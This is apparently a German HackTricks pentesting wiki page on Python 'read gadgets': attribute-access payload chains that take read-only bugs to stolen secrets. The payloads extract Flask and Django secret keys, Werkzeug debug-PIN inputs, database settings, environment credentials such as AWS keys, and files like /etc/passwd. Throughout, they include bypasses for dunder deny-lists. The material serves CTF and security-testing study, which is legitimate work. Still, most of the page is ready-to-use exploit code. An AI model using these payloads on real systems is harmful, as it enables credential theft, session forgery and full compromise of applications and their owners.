# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Verschiedene Schwachstellen wie [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) oder [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) könnten es dir ermöglichen, **interne Python-Daten zu lesen, aber keinen Code auszuführen**. Daher muss ein Pentester diese Leseberechtigungen optimal nutzen, um **sensible Berechtigungen zu erlangen und die Schwachstelle zu eskalieren**.

### Flask – Secret Key auslesen

Die Hauptseite einer Flask-Anwendung enthält wahrscheinlich das globale **`app`**-Objekt, in dem dieses **Secret konfiguriert ist**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
In diesem Fall ist es möglich, auf dieses Objekt zuzugreifen, indem ein beliebiger Gadget zum **Zugriff auf globale Objekte** von der Seite [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html) verwendet wird.

Falls sich **die Schwachstelle in einer anderen Python-Datei befindet**, wird ein Gadget benötigt, um Dateien zu durchsuchen und zur Hauptdatei zu gelangen, um auf das globale Objekt `app.secret_key` **zuzugreifen** und mithilfe dieses Schlüssels [**die Berechtigungen zu erweitern**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Ein Payload wie dieser [aus diesem Write-up](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Verwende dieses Payload, um **app.secret_key zu lesen**. Wenn der ursprüngliche Bug dir außerdem eine Write Primitive liefert (zum Beispiel Class Pollution), kann derselbe Pfad verwendet werden, um ihn zu ersetzen und Cookies von Flask mit höheren Berechtigungen zu signieren.

### Werkzeug - machine_id und node uuid

Mit [**diesen Payloads aus diesem Writeup**](https://vozec.fr/writeups/tweedle-dum-dee/) kannst du auf die **machine_id** und die **uuid** des Nodes zugreifen. Dabei handelt es sich um die **privaten Bits**, die du benötigst, um die [**Werkzeug-PIN zu generieren**](../../network-services-pentesting/pentesting-web/werkzeug.md) und auf die Python-Konsole unter `/console` zuzugreifen, wenn der **Debug-Modus aktiviert** ist:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Beachte, dass du den **lokalen Pfad des Servers zur `app.py`** erhalten kannst, indem du einen **Fehler** auf der Webseite erzeugst, der dir den **Pfad** anzeigt.

Wenn sich die Schwachstelle in einer anderen Python-Datei befindet, überprüfe den vorherigen Flask-Trick, um auf die Objekte aus der Haupt-Python-Datei zuzugreifen.

### Django - SECRET_KEY und settings module

Das Django-settings-Objekt wird in `sys.modules` zwischengespeichert, sobald die Anwendung startet. Mit ausschließlich lesenden Primitives kannst du den **`SECRET_KEY`**, Fallback-Keys, Datenbank-Zugangsdaten oder Signatur-Salts leaken:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Wenn sich das verwundbare Gadget in einem anderen Modul befindet, durchlaufe zuerst die Globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` sind genauso wertvoll wie der aktuelle `SECRET_KEY`: Sie validieren während der Rotation weiterhin alte signierte Werte.<sup>[[1]](#references)</sup> Leake außerdem `SESSION_ENGINE` und `SESSION_SERIALIZER`, um schnell festzustellen, ob die Auswirkungen nur Cookie-Fälschung umfassen oder etwas Stärkeres ermöglichen. Details zu den Auswirkungen auf Webanwendungen findest du auf der [**Django pentesting-Seite**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - Quellcode und Dateien lesen

Geladene Python-Module behalten normalerweise einen `__loader__`. Datei-basierte Loader stellen häufig `get_source()` und `get_data()` bereit. Diese sind perfekte **read-only primitives**, wenn du bereits auf ein Modulobjekt zugreifen kannst, aber nicht auf `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Dies ist sehr nützlich, um **config modules, blueprints, helper files oder versteckte Routen** auszulesen und API keys, DSNs, flag paths oder zusätzliche Gadget-Einstiegspunkte wiederherzustellen.

Wenn du nur über eine subclass enumeration verfügst, suche den loader nach Namen statt einen Index fest zu codieren:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globale Variablen von Generator-/Coroutine-Frames

Wenn du ein Generator-/Coroutine-Objekt erstellen oder erreichen kannst, kann dessen Frame globale Variablen **ohne ein `__globals__`-Gadget irgendeiner Funktion** leaken. Das ist nützlich gegen Filter, die nur Dunder-Namen blockieren und Frame-Attribute wie `gi_frame`, `ag_frame`, `cr_frame` oder `f_globals` vergessen:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Sobald du die Frame-Globals hast, fährst du genau wie bei den anderen Gadgets (`sys.modules`, settings objects, `os.environ` usw.) fort. Aktuelle sandbox escapes entdecken dies immer wieder neu, da `gi_frame` und `f_globals` keine Dunder-Attribute sind und naive Deny-Lists häufig überstehen.

### Umgebungsvariablen / cloud creds via geladenen Modulen

Viele Jails importieren noch immer irgendwo `os` oder `sys`. Du kannst jede erreichbare Funktion `__init__.__globals__` missbrauchen, um zum bereits importierten Modul `os` zu pivotieren und **Umgebungsvariablen** mit API-Tokens, Cloud-Keys oder Flags zu dumpen:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Wenn der Subclass-Index gefiltert wird, verwende Loader:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Umgebungsvariablen sind häufig die einzigen Secrets, die benötigt werden, um von read zu vollständiger Kompromittierung überzugehen (Cloud-IAM-Keys, Datenbank-URLs, Signing Keys usw.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), betroffene Versionen `<0.61.0`) ermöglichte **class pollution** durch speziell erstellte Component-Requests. Ein Property-Pfad wie `__init__.__globals__` konnte die Globals des Component-Moduls und importierte Module erreichen; der Advisory demonstriert das Überschreiben von Djangos `SECRET_KEY` und Werten in `os.environ`, statt eines Read-only-Exploits.<sup>[[5]](#references)</sup> Falls ein separater Bug Lesezugriff auf denselben Object-Graph ermöglicht, können diese Globals Konfigurationen und Credentials offenlegen, ohne dass Code Execution erforderlich ist.

### Gadget collections for chaining

Aktuelle CTFs und Pyjail-Forschung zeigen zuverlässige Read-Chains, die ausschließlich mit Attribute Access und Subclass Enumeration aufgebaut werden. Community-maintained Listen wie [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) katalogisieren Hunderte minimaler Gadgets, die kombiniert werden können, um von Objekten zu `__globals__`, `sys.modules` und schließlich zu sensiblen Daten zu navigieren.<sup>[[2]](#references)</sup> Bevorzuge **attribute/name based searches** gegenüber rohen Subclass-Indexes, da sich die Position von `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` usw. zwischen Python-Versionen und durch zusätzlich importierte Libraries ändert.

## References

- [1] [Django-Dokumentation zu kryptografischer Signierung](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python-Sandbox-Gadget-Wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC-2023-Writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
